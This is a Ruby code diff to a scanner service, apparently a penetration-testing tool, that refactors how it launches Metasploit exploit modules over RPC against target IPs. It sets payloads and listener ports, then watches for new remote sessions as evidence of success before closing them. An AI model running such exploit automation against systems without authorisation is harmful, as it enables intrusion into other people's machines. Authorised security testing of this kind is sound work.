@@ -62,15 +62,6 @@ class ScanService
                   puts "[SafeMode] Shared console #{Thread.current[:msf_aux_console]} opened for #{target_ip}"
                 end
               end
-            else
-              exploit_client = rpc_client
-              if exploit_client
-                con = exploit_client.call('console.create') rescue nil
-                if con
-                  Thread.current[:msf_exploit_console] = con['id'].to_s
-                  puts "[ExploitMode] Shared console #{Thread.current[:msf_exploit_console]} opened for #{target_ip}"
-                end
-              end
             end
 
             succeeded_exploit_ids = Set.new
@@ -149,13 +140,6 @@ class ScanService
               rpc_client&.call('console.destroy', Thread.current[:msf_aux_console]) rescue nil
               puts "[SafeMode] Shared console closed for #{target_ip}"
               Thread.current[:msf_aux_console] = nil
-            end
-
-            # Destroy the shared exploit console now that all modules are done
-            if !@scan_options[:safe_mode] && Thread.current[:msf_exploit_console]
-              rpc_client&.call('console.destroy', Thread.current[:msf_exploit_console]) rescue nil
-              puts "[ExploitMode] Shared console closed for #{target_ip}"
-              Thread.current[:msf_exploit_console] = nil
             end
 
             disconnect_network()
@@ -362,86 +346,58 @@ class ScanService
   end
 
   def rpc_run_exploit(client, exploit, target_ip, port, proxy, timeout_secs)
-    mod_name   = exploit['metasploit_module'].sub(/\Aexploit\//, '')
-    use_bind   = proxy.present? || !local_network?(target_ip)
-    payload    = exploit['default_payload'].presence || select_payload(client, mod_name, use_bind)
-    shared_cid = Thread.current[:msf_exploit_console]
-    own_cid    = nil
+    mod_name = exploit['metasploit_module'].sub(/\Aexploit\//, '')
+    use_bind = proxy.present? || !local_network?(target_ip)
+    payload  = exploit['default_payload'].presence || select_payload(client, mod_name, use_bind)
 
     unless payload
       puts "No compatible payload for #{mod_name}, skipping"
       return { success: false, evidence: nil }
     end
 
-    unless shared_cid
-      con     = client.call('console.create')
-      own_cid = con['id'].to_s
+    opts = {
+      'RHOSTS'         => target_ip,
+      'PAYLOAD'        => payload,
+      'LPORT'          => Aegis.config.msf.lport,
+      'ConnectTimeout' => 15,
+      'ExitOnSession'  => false
+    }
+    opts['RPORT']   = port if port
+    opts['Proxies'] = proxy if proxy.present?
+    # LHOST is intentionally omitted — msfrpcd runs on the host network and
+    # auto-detects the correct outbound interface for each target via UDPSocket routing.
+
+    puts "RPC module.execute: #{target_ip}:#{port} [#{mod_name}] payload=#{payload}#{proxy ? " via #{proxy}" : ""}"
+
+    sessions_before = ((client.call('session.list') rescue nil) || {}).keys.map(&:to_s).to_set
+
+    res    = client.call('module.execute', 'exploit', mod_name, opts)
+    job_id = res['job_id']&.to_s
+
+    success  = false
+    evidence = nil
+    deadline = Time.now + timeout_secs
+
+    while Time.now < deadline
+      sleep 2
+      sessions_now = (client.call('session.list') rescue {})
+      new_sessions = sessions_now.reject { |id, _| sessions_before.include?(id.to_s) }
+      if new_sessions.any?
+        sid, sinfo = new_sessions.first
+        evidence = "Session #{sid} opened: #{sinfo['tunnel_local']} -> #{sinfo['tunnel_peer']} (#{sinfo['type']})"
+        success  = true
+        client.call('session.stop', sid.to_s) rescue nil
+        break
+      end
     end
 
-    cid = shared_cid || own_cid
+    client.call('job.stop', job_id) rescue nil if job_id
 
-    begin
-      # Drain any leftover output from previous modules on the shared console so
-      # we only look at output produced by THIS module's run.
-      begin
-        2.times { client.call('console.read', cid) rescue nil }
-      end
-
-      lhost = outbound_ip_for(target_ip, cid: cid)
-
-      # Drain ruby command output left by LHOST detection before running the exploit.
-      begin
-        2.times { client.call('console.read', cid) rescue nil }
-      end
-
-      lport = Aegis.config.msf.lport
-
-      cmds = [
-        "use exploit/#{mod_name}",
-        "set RHOSTS #{target_ip}",
-        (port ? "set RPORT #{port}" : nil),
-        "set PAYLOAD #{payload}",
-        (lhost ? "set LHOST #{lhost}" : nil),
-        "set LPORT #{lport}",
-        "set ConnectTimeout 15",
-        "set ExitOnSession false",
-        (proxy ? "set Proxies #{proxy}" : nil),
-        "exploit -z"
-      ].compact.join("\n") + "\n"
-
-      puts "RPC exploit (console): #{target_ip}:#{port} [#{mod_name}] payload=#{payload}#{proxy ? " via #{proxy}" : ""}"
-      client.call('console.write', cid, cmds)
-      sleep 3  # give MSF time to start the module before first read
-
-      deadline         = Time.now + timeout_secs
-      output           = ''
-      consecutive_idle = 0
-      completion_re    = /Exploit completed|Auxiliary module execution completed|Post module execution completed|session \d+ opened|Meterpreter session|Command shell session/i
-
-      while Time.now < deadline
-        sleep 2
-        res     = client.call('console.read', cid) rescue {}
-        chunk   = res['data'].to_s
-        output += chunk
-        break if output.match?(completion_re)
-        if res['busy']
-          consecutive_idle = 0
-        else
-          consecutive_idle += 1
-          break if consecutive_idle >= 3
-        end
-      end
-
-      parsed = Aegis::Msf::OutputParser.parse_exploit_mode(output)
-      dump_msf_debug(exploit, target_ip, port, nil, output, output, parsed[:success], []) if Aegis.config.msf.debug
-      puts parsed[:success] ? "[+] #{mod_name} session opened on #{target_ip}" : "[-] #{mod_name} — no session on #{target_ip}"
-      { success: parsed[:success], evidence: parsed[:evidence] }
-    ensure
-      client.call('console.destroy', own_cid) rescue nil if own_cid
-    end
+    dump_msf_debug(exploit, target_ip, port, nil, evidence.to_s, evidence.to_s, success, []) if Aegis.config.msf.debug
+    puts success ? "[+] #{mod_name} session opened on #{target_ip}" : "[-] #{mod_name} — no session on #{target_ip}"
+    { success: success, evidence: evidence }
   rescue Msf::RPC::ServerException => e
     puts "RPC ServerException [#{mod_name}]: #{e.message}"
-    Thread.current[:msf_exploit_console] = nil if shared_cid  # console may be dead; clear so next module creates fresh
     { success: false, evidence: nil }
   end
 
